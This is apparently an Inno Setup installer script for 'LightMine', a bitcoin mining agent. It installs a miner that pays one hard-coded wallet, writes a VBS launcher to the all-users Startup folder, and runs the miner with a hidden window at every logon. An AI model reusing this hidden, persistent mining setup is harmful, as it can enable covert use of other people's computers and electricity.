; ##########################################################################
; # LightMine - Distributed Solo Mining Agent (v1.2 Polished)
; ##########################################################################

#define MyAppVersion "1.2.5"

[Setup]
AppName=LightMine
AppVersion={#MyAppVersion}
AppPublisher=Sorlac
PrivilegesRequired=admin
DefaultDirName={commonappdata}\LightMine
DefaultGroupName=LightMine
OutputDir=.
OutputBaseFilename=LightMine_Setup_v{#MyAppVersion}
Compression=lzma
SolidCompression=yes

[Languages]
Name: "portuguese"; MessagesFile: "compiler:Languages\Portuguese.isl"

[Files]
Source: "src\LightMine.exe"; DestDir: "{commonappdata}\LightMine"; Flags: ignoreversion

[UninstallDelete]
Type: files; Name: "{commonstartup}\LightMine.vbs"
Type: filesandordirs; Name: "{commonappdata}\LightMine"

[Code]
var
  UserName: string;
  WorkerIdFilePath, LogFilePath: string;
  InputPage: TInputQueryWizardPage;

procedure LogToFile(Msg: string);
var
  LogStrings: TStringList;
begin
  LogStrings := TStringList.Create;
  try
    if FileExists(LogFilePath) then
      LogStrings.LoadFromFile(LogFilePath);
    LogStrings.Add(GetDateTimeString('yyyy/mm/dd hh:nn:ss', '-', ':') + ' - ' + Msg);
    LogStrings.SaveToFile(LogFilePath);
  finally
    LogStrings.Free;
  end;
end;

// Função avançada para normalizar o nome (remove acentos e espaços)
function CleanWorkerName(S: string): string;
var
  I: Integer;
  C: Char;
  Res: string;
begin
  Res := '';
  for I := 1 to Length(S) do
  begin
    C := S[I];
    case C of
      'á','à','ã','â','ä': Res := Res + 'a';
      'Á','À','Ã','Â','Ä': Res := Res + 'A';
      'é','è','ê','ë': Res := Res + 'e';
      'É','È','Ê','Ë': Res := Res + 'E';
      'í','ì','î','ï': Res := Res + 'i';
      'Í','Ì','Î','Ï': Res := Res + 'I';
      'ó','ò','õ','ô','ö': Res := Res + 'o';
      'Ó','Ò','Õ','Ô','Ö': Res := Res + 'O';
      'ú','ù','û','ü': Res := Res + 'u';
      'Ú','Ù','Û','Ü': Res := Res + 'U';
      'ç': Res := Res + 'c';
      'Ç': Res := Res + 'C';
      'a'..'z', 'A'..'Z', '0'..'9': Res := Res + C;
    end;
  end;
  Result := Res;
end;



procedure InitializeWizard;
var
  UserStrings: TStringList;
begin
  WorkerIdFilePath := ExpandConstant('{commonappdata}\LightMine\UserName.txt');
  LogFilePath := ExpandConstant('{commonappdata}\LightMine\InstallLog.txt');

  if FileExists(WorkerIdFilePath) then
  begin
    UserStrings := TStringList.Create;
    try
      try
        UserStrings.LoadFromFile(WorkerIdFilePath);
        UserName := UserStrings[0];
      except
      end;
    finally
      UserStrings.Free;
    end;
  end;

  if UserName = '' then
  begin
    InputPage := CreateInputQueryPage(wpWelcome, 'Configuração LightMine', 'Identificação do Minerador', 'Por favor, insira seu nome de usuário:');
    InputPage.Add('Nome de Usuário/Worker:', False);
  end;
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  BatFilePath, VbsFilePath: string;
  BatFileContent, VbsFileContent: string;
  UserStrings: TStringList;
  FinalWorkerName: string;
begin
  if CurStep = ssInstall then
  begin
    if not DirExists(ExpandConstant('{commonappdata}\LightMine')) then
      CreateDir(ExpandConstant('{commonappdata}\LightMine'));

    if UserName = '' then
      UserName := InputPage.Values[0];
    
    FinalWorkerName := CleanWorkerName(UserName);
    LogToFile('Normalização de Worker: ' + UserName + ' -> ' + FinalWorkerName);

    UserStrings := TStringList.Create;
    try
      UserStrings.Add(UserName);
      UserStrings.SaveToFile(WorkerIdFilePath);
    finally
      UserStrings.Free;
    end;



    // Conteúdo do .bat atualizado para LightMine.exe
    BatFileContent := '@echo off' + #13#10 +
                      'cd /d "' + ExpandConstant('{commonappdata}\LightMine') + '"' + #13#10 +
                      'title LightMine Engine' + #13#10 +
                      'LightMine.exe -a sha256d -o stratum+tcp://public-pool.io:21496 -u bc1q5cpqasnz7k33m30xzdn08a8x5usmnd0qggfpgf.' + FinalWorkerName + ' -p x -t 1';
    
    VbsFileContent := 'Set WshShell = CreateObject("WScript.Shell")' + #13#10 +
                      'WshShell.Run """' + ExpandConstant('{commonappdata}\LightMine\LightMine.bat') + '""", 0, False' + #13#10 +
                      'Set WshShell = Nothing';

    BatFilePath := ExpandConstant('{commonappdata}\LightMine\LightMine.bat');
    VbsFilePath := ExpandConstant('{commonstartup}\LightMine.vbs');
    
    SaveStringToFile(BatFilePath, BatFileContent, False);
    SaveStringToFile(VbsFilePath, VbsFileContent, False);
  end;
end;

[Run]
Filename: "wscript.exe"; Parameters: """{commonstartup}\LightMine.vbs"""; Description: "Iniciar LightMine agora em segundo plano"; Flags: nowait postinstall skipifsilent
